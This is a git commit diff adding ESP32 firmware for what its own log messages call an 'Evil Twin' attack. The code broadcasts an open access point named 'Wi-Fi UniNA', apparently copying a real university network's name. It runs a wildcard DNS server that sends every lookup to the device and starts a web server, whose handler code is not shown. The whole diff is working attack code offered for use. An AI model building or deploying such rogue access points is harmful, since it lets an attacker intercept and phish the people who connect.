22a882ae9511f1c28f63005e8e691bca09fb4e1b
giuseppe-maglione <giuseppemaglione.mail@gmail.com>
2025-06-05 19:47:01 +0200

    added esp32 code

---
+++ esp32/ap_handler.cpp
@@ -0,0 +1,41 @@
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+
+#include "web_handler.h"
+#include "ap_handler.h"
+
+const char *ap_ssid = "Wi-Fi UniNA";
+const char *ap_password = "";
+
+const byte DNS_PORT = 53;
+DNSServer dns_server;
+WebServer http_server(80);
+
+bool ap_active = false;
+
+void ap_start() {
+    WiFi.softAP(ap_ssid, ap_password);
+    dns_server.start(DNS_PORT, "*", WiFi.softAPIP());
+    setup_web_handler();
+    http_server.begin();
+    ap_active = true;
+
+    Serial.println("Evil Twin Started");
+    Serial.println("IP Address:");
+    Serial.println(WiFi.softAPIP());
+}
+
+void ap_stop() {
+    http_server.stop();
+    dns_server.stop();
+    WiFi.softAPdisconnect(true);
+    ap_active = false;
+
+    Serial.println("Evil Twin Stopped");
+}
+
+bool ap_is_active() {
+    return ap_active;
+}
+
---
+++ esp32/ap_handler.h
@@ -0,0 +1,9 @@
+#ifndef AP_HANDLER_H
+#define AP_HANDLER_H
+
+void ap_start();
+void ap_stop();
+bool ap_is_active();
+
+#endif
+
